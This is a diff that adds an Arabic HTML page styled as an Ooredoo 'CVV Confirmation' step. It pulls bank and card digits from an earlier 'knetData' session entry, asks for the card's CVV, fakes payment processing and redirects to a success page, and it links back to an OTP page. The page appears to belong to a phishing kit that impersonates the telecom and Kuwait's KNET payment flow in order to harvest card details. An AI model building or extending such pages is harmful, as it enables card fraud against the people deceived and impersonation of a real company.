@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ooredoo - CVV Confirmation</title>
+    <link rel="stylesheet" href="/myooredoo/assets/css/vendors/bootstrap.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            direction: rtl;
+        }
+
+        .cvv-container {
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            max-width: 500px;
+            width: 100%;
+            padding: 40px;
+        }
+
+        .cvv-header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .cvv-icon {
+            font-size: 60px;
+            margin-bottom: 20px;
+        }
+
+        .cvv-header h1 {
+            color: #d41e3a;
+            font-size: 28px;
+            margin-bottom: 10px;
+        }
+
+        .cvv-header p {
+            color: #666;
+            font-size: 14px;
+        }
+
+        .payment-details {
+            background: #f5f5f5;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 30px;
+        }
+
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 12px;
+            font-size: 14px;
+        }
+
+        .detail-row:last-child {
+            margin-bottom: 0;
+            padding-top: 12px;
+            border-top: 1px solid #ddd;
+            font-weight: 600;
+            color: #d41e3a;
+            font-size: 16px;
+        }
+
+        .detail-label {
+            color: #666;
+        }
+
+        .detail-value {
+            color: #333;
+            font-weight: 500;
+        }
+
+        .form-section {
+            margin-bottom: 30px;
+        }
+
+        .form-section h3 {
+            color: #333;
+            font-size: 16px;
+            margin-bottom: 15px;
+            font-weight: 600;
+            border-bottom: 2px solid #d41e3a;
+            padding-bottom: 10px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #333;
+            font-size: 14px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 18px;
+            text-align: center;
+            letter-spacing: 5px;
+            transition: border-color 0.3s;
+            font-weight: bold;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #d41e3a;
+            box-shadow: 0 0 0 3px rgba(212, 30, 58, 0.1);
+        }
+
+        .cvv-info {
+            background: #fff3e0;
+            border-left: 4px solid #ff9800;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            color: #333;
+        }
+
+        .cvv-info strong {
+            color: #ff9800;
+        }
+
+        .card-info-box {
+            background: #f0f7ff;
+            border-left: 4px solid #2196f3;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            color: #333;
+        }
+
+        .card-info-box strong {
+            color: #2196f3;
+        }
+
+        .button-group {
+            display: flex;
+            gap: 15px;
+            margin-top: 30px;
+        }
+
+        .btn {
+            flex: 1;
+            padding: 14px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .btn-primary {
+            background-color: #d41e3a;
+            color: white;
+        }
+
+        .btn-primary:hover:not(:disabled) {
+            background-color: #b01830;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(212, 30, 58, 0.3);
+        }
+
+        .btn-primary:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+
+        .btn-secondary {
+            background-color: #e0e0e0;
+            color: #333;
+        }
+
+        .btn-secondary:hover {
+            background-color: #d0d0d0;
+        }
+
+        .error-message {
+            background-color: #ffebee;
+            color: #c62828;
+            padding: 12px;
+            border-radius: 5px;
+            margin-bottom: 15px;
+            display: none;
+        }
+
+        .success-message {
+            background-color: #e8f5e9;
+            color: #2e7d32;
+            padding: 12px;
+            border-radius: 5px;
+            margin-bottom: 15px;
+            display: none;
+        }
+
+        .processing {
+            display: none;
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #d41e3a;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 500px) {
+            .cvv-container {
+                padding: 25px;
+            }
+
+            .button-group {
+                flex-direction: column;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="cvv-container">
+        <!-- Header -->
+        <div class="cvv-header">
+            <div class="cvv-icon">🔐</div>
+            <h1>تأكيد الدفع</h1>
+            <p>أدخل رمز CVV لتأكيد عملية الدفع</p>
+        </div>
+
+        <!-- Messages -->
+        <div class="error-message" id="errorMessage"></div>
+        <div class="success-message" id="successMessage"></div>
+
+        <!-- Normal Form -->
+        <div id="formContent">
+            <!-- Payment Details -->
+            <div class="payment-details">
+                <div class="detail-row">
+                    <span class="detail-label">رقم الهاتف:</span>
+                    <span class="detail-value" id="phoneDetail">96501234567</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">المبلغ:</span>
+                    <span class="detail-value">د.ك 5.000</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">البنك:</span>
+                    <span class="detail-value" id="bankDetail">NBK</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">آخر 4 أرقام:</span>
+                    <span class="detail-value" id="cardDetail">••••</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">الإجمالي:</span>
+                    <span class="detail-value">د.ك 5.000</span>
+                </div>
+            </div>
+
+            <!-- Info Boxes -->
+            <div class="card-info-box">
+                ℹ️ <strong>معلومات البطاقة:</strong> تم التحقق من بيانات بطاقتك بنجاح. الآن أدخل رمز CVV لإكمال العملية.
+            </div>
+
+            <div class="cvv-info">
+                🔒 <strong>أين تجد CVV؟</strong> رمز CVV يتكون من 3 أرقام يوجد على ظهر بطاقتك.
+            </div>
+
+            <!-- CVV Form -->
+            <form id="cvvForm">
+                <div class="form-section">
+                    <h3>رمز الأمان (CVV)</h3>
+                    <div class="form-group">
+                        <label>أدخل رمز CVV</label>
+                        <input type="text" id="cvvInput" placeholder="123" maxlength="4" inputmode="numeric" required>
+                    </div>
+                </div>
+
+                <!-- Buttons -->
+                <div class="button-group">
+                    <button type="button" class="btn btn-secondary" onclick="goBack()">رجوع</button>
+                    <button type="submit" class="btn btn-primary">تأكيد الدفع</button>
+                </div>
+            </form>
+        </div>
+
+        <!-- Processing -->
+        <div class="processing" id="processingContent">
+            <div class="spinner"></div>
+            <h3 style="color: #d41e3a; margin-bottom: 10px;">جاري معالجة الدفع...</h3>
+            <p style="color: #666;">يرجى الانتظار قليلاً</p>
+        </div>
+    </div>
+
+    <script>
+        // Load payment details from session
+        function loadPaymentDetails() {
+            const knetData = JSON.parse(sessionStorage.getItem('knetData') || '{}');
+            if (knetData.bank) {
+                document.getElementById('bankDetail').textContent = knetData.bank;
+            }
+            if (knetData.lastFourDigits) {
+                document.getElementById('cardDetail').textContent = '•••• ' + knetData.lastFourDigits;
+            }
+        }
+
+        // CVV input validation
+        document.getElementById('cvvInput').addEventListener('input', function(e) {
+            this.value = this.value.replace(/\D/g, '');
+        });
+
+        // Form submission
+        document.getElementById('cvvForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const cvv = document.getElementById('cvvInput').value;
+
+            if (!cvv || cvv.length < 3) {
+                showError('أدخل رمز CVV صحيح (3 أرقام على الأقل)');
+                return;
+            }
+
+            // Show processing
+            document.getElementById('formContent').style.display = 'none';
+            document.getElementById('processingContent').style.display = 'block';
+
+            // Simulate payment processing
+            setTimeout(() => {
+                completePayment();
+            }, 3000);
+        });
+
+        function completePayment() {
+            // Save payment confirmation
+            sessionStorage.setItem('paymentCompleted', 'true');
+            
+            // Show success
+            document.getElementById('processingContent').style.display = 'none';
+            document.getElementById('formContent').style.display = 'block';
+            
+            showSuccess('✅ تم الدفع بنجاح! سيتم تحويلك إلى صفحة التأكيد...');
+            
+            setTimeout(() => {
+                window.location.href = '/myooredoo/success.html';
+            }, 2000);
+        }
+
+        function showError(message) {
+            const errorEl = document.getElementById('errorMessage');
+            errorEl.textContent = message;
+            errorEl.style.display = 'block';
+            setTimeout(() => {
+                errorEl.style.display = 'none';
+            }, 5000);
+        }
+
+        function showSuccess(message) {
+            const successEl = document.getElementById('successMessage');
+            successEl.textContent = message;
+            successEl.style.display = 'block';
+        }
+
+        function goBack() {
+            window.location.href = '/myooredoo/otp.html';
+        }
+
+        // Load details on page load
+        loadPaymentDetails();
+        document.getElementById('cvvInput').focus();
+    </script>
+</body>
+</html>
